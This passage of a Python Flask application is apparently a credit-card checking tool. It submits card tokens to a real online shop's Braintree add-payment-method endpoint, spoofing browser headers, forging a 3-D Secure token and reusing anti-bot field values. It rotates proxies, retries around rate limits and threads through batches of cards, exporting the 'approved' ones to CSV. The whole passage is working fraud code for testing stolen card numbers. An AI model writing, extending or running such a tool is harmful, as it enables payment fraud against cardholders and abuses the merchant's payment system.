        tok = r4.json()['data']['tokenizeCreditCard']['token']

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://arrows-uk.com',
            'Referer': 'https://arrows-uk.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': json.dumps({
                "correlation_id": str(uuid.uuid4())
            }),
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': json.dumps({
                "environment": "production",
                "clientApiUrl": "https://api.braintreegateway.com:443/merchants/2sb4nmxm4pfgpgdm/client_api",
                "assetsUrl": "https://assets.braintreegateway.com",
                "analytics": {
                    "url": "https://client-analytics.braintreegateway.com/2sb4nmxm4pfgpgdm"
                },
                "merchantId": "2sb4nmxm4pfgpgdm",
                "venmo": "off",
                "graphQL": {
                    "url": "https://payments.braintree-api.com/graphql",
                    "features": ["tokenize_credit_cards"]
                },
                "applePayWeb": {
                    "countryCode": "IE",
                    "currencyCode": "GBP",
                    "merchantIdentifier": "2sb4nmxm4pfgpgdm",
                    "supportedNetworks": ["visa", "mastercard"]
                },
                "challenges": ["cvv", "postal_code"],
                "creditCards": {
                    "supportedCardTypes": [
                        "Discover", "Maestro", "UK Maestro",
                        "MasterCard", "Visa", "American Express"
                    ]
                },
                "threeDSecureEnabled": True,
                "threeDSecure": {
                    "cardinalAuthenticationJWT": make_jwt(),
                    "cardinalSongbirdUrl": "https://songbird.cardinalcommerce.com/edge/v1/songbird.js",
                    "cardinalSongbirdIdentityHash": None
                },
                "paypalEnabled": False
            }),
            'billing_address_1': f"Street {random.randint(1000, 9999)}",
            'woocommerce-add-payment-method-nonce': noncec,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'ct_bot_detector_event_token': 'f683b7fbb380e9d05396c26f37711acd6854975e9c5595c0a8a42055110a5426',
            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19hZGRyZXNzXzEiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6ImJyYWludHJlZV9jY19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2RldmljZV9kYXRhIGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19jb25maWdfZGF0YSB3b29jb21tZXJjZS1hZGRfcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgY3RfYm90X2RldGVjdG9yX2V2ZW50X3Rva2VuIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6OH19',
        }

        r5 = r.post('https://arrows-uk.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data, timeout=30)
        error_message = (re.search(r'<div class="message-container container alert-color medium-text-center">.*?</span>\s*(.*?)\s*</div>', r5.text, re.DOTALL) or [""]).group(1).strip()
        
        # Check if approved
        is_approved = any(keyword in error_message.lower() for keyword in approved_keywords)
        status = "APPROVED" if is_approved else "DECLINED"
        
        # Calculate processing time
        processing_time = round(time.time() - start_time, 2)
        
        # Update stats
        stats["total"] += 1
        if is_approved:
            stats["live"] += 1
        else:
            stats["dead"] += 1
        
        if stats["total"] > 0:
            stats["success_rate"] = round((stats["live"] / stats["total"]) * 100, 2)
            stats["avg_time"] = round(((stats["avg_time"] * (stats["total"] - 1)) + processing_time) / stats["total"], 2)
        
        # Add result
        result = {
            "card": card_data,
            "status": status,
            "message": error_message,
            "time": processing_time
        }
        results.append(result)
        
        return result
    
    except Exception as e:
        # Handle exceptions
        processing_time = round(time.time() - start_time, 2)
        
        stats["total"] += 1
        stats["dead"] += 1
        
        if stats["total"] > 0:
            stats["success_rate"] = round((stats["live"] / stats["total"]) * 100, 2)
            stats["avg_time"] = round(((stats["avg_time"] * (stats["total"] - 1)) + processing_time) / stats["total"], 2)
        
        result = {
            "card": card_data,
            "status": "ERROR",
            "message": str(e),
            "time": processing_time
        }
        results.append(result)
        
        return result

def process_cards(cards, proxies=None):
    global checking, live_proxies
    
    for card in cards:
        if not checking:
            break
            
        # Use a random proxy for each card
        proxy_dict = None
        if live_proxies:
            # Rotate through live proxies
            proxy_dict = random.choice(live_proxies)
        
        # Retry up to 3 times if failed
        for attempt in range(3):
            try:
                result = check_card(card, proxy_dict)
                
                # Check for retry conditions
                if result["status"] == "ERROR":
                    # Always retry on errors
                    if attempt < 2:
                        time.sleep(5)  # Wait before retry
                        continue
                elif "wait for 20 seconds" in result["message"].lower():
                    # Retry on 20-second error
                    if attempt < 2:
                        time.sleep(25)  # Wait a bit longer than required
                        continue
                elif "'NoneType' object has no attribute 'group'" in result["message"] or "'list' object has no attribute 'group'" in result["message"]:
                    # Retry on group errors
                    if attempt < 2:
                        time.sleep(5)  # Wait before retry
                        continue
                
                # If we get here, either we succeeded or we've exhausted retries
                break
                
            except Exception as e:
                if attempt == 2:  # Last attempt
                    # Add as error
                    processing_time = round(time.time() - start_time, 2)
                    stats["total"] += 1
                    stats["dead"] += 1
                    
                    if stats["total"] > 0:
                        stats["success_rate"] = round((stats["live"] / stats["total"]) * 100, 2)
                        stats["avg_time"] = round(((stats["avg_time"] * (stats["total"] - 1)) + processing_time) / stats["total"], 2)
                    
                    result = {
                        "card": card,
                        "status": "ERROR",
                        "message": str(e),
                        "time": processing_time
                    }
                    results.append(result)
                else:
                    time.sleep(5)  # Wait before retry

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check_proxies', methods=['POST'])
def check_proxies():
    global proxy_results, live_proxies
    
    proxies = request.form.get('proxies').strip().split('\n')
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    
    if not proxies:
        return jsonify({"status": "no_proxies"})
    
    proxy_results = []
    live_proxies = []
    
    # Check proxies in parallel with increased workers for faster checking
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                result = future.result()
                proxy_results.append(result)
                
                if result["status"] == "LIVE":
                    live_proxies.append(result["proxy_dict"])
            except Exception as e:
                proxy_results.append({
                    "proxy": proxy,
                    "status": "DEAD",
                    "message": f"Error: {str(e)}",
                    "time": 0,
                    "proxy_dict": None
                })
    
    live_count = sum(1 for result in proxy_results if result["status"] == "LIVE")
    dead_count = len(proxy_results) - live_count
    
    return jsonify({
        "status": "success",
        "results": proxy_results,
        "live_count": live_count,
        "dead_count": dead_count
    })

@app.route('/start', methods=['POST'])
def start_checking():
    global checking, threads, results, stats, live_proxies
    
    if checking:
        return jsonify({"status": "already_running"})
    
    cards = request.form.get('cards').strip().split('\n')
    cards = [card.strip() for card in cards if card.strip()]
    
    proxies = request.form.get('proxies', '').strip()
    proxy_list = [proxy.strip() for proxy in proxies.split('\n')] if proxies else []
    
    if not cards:
        return jsonify({"status": "no_cards"})
    
    if not proxy_list:
        return jsonify({"status": "no_proxies"})
    
    checking = True
    results = []
    stats = {
        "total": 0,
        "live": 0,
        "dead": 0,
        "success_rate": 0,
        "avg_time": 0
    }
    
    # If we don't have live proxies yet, check them first
    if not live_proxies:
        # Check proxies in parallel with increased workers for faster checking
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxy_list}
            
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    result = future.result()
                    
                    if result["status"] == "LIVE":
                        live_proxies.append(result["proxy_dict"])
                except Exception as e:
                    # Skip dead proxies
                    pass
    
    # If still no live proxies, return error
    if not live_proxies:
        checking = False
        return jsonify({"status": "no_live_proxies"})
    
    # Split cards into chunks for threading (3 threads)
    chunk_size = max(1, len(cards) // 3)
    card_chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
    
    # Start threads
    threads = []
    for chunk in card_chunks:
        thread = threading.Thread(target=process_cards, args=(chunk, proxy_list))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    return jsonify({"status": "started", "total_cards": len(cards)})

@app.route('/stop', methods=['POST'])
def stop_checking():
    global checking
    
    checking = False
    
    return jsonify({"status": "stopped"})

@app.route('/clear', methods=['POST'])
def clear_results():
    global results, stats
    
    results = []
    stats = {
        "total": 0,
        "live": 0,
        "dead": 0,
        "success_rate": 0,
        "avg_time": 0
    }
    
    return jsonify({"status": "cleared"})

@app.route('/status')
def get_status():
    global checking, stats, results
    
    return jsonify({
        "checking": checking,
        "stats": stats,
        "results": results[-20:]  # Return last 20 results to avoid too much data
    })

@app.route('/export/<type>')
def export_results(type):
    global results
    
    if type == "approved":
        filtered_results = [r for r in results if r["status"] == "APPROVED"]
        filename = "approved_cards.csv"
    elif type == "dead":
        filtered_results = [r for r in results if r["status"] in ["DECLINED", "ERROR"]]
        filename = "dead_cards.csv"
    else:
        return jsonify({"status": "invalid_type"})
    
    if not filtered_results:
        return jsonify({"status": "no_results", "message": f"No {type} cards to download"})
    
    # Create CSV using StringIO
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(["Card", "Status", "Response", "Time (s)"])
    
    for result in filtered_results:
        writer.writerow([result["card"], result["status"], result["message"], result["time"]])
    
    output.seek(0)
    
    # Convert StringIO to bytes for send_file
    output_bytes = output.getvalue().encode('utf-8')
    
    return send_file(
        BytesIO(output_bytes),
        mimetype='text/csv',
        as_attachment=True,
        download_name=filename
    )

if __name__ == '__main__':
    app.run(debug=True, threaded=True, host='0.0.0.0', port=5000)
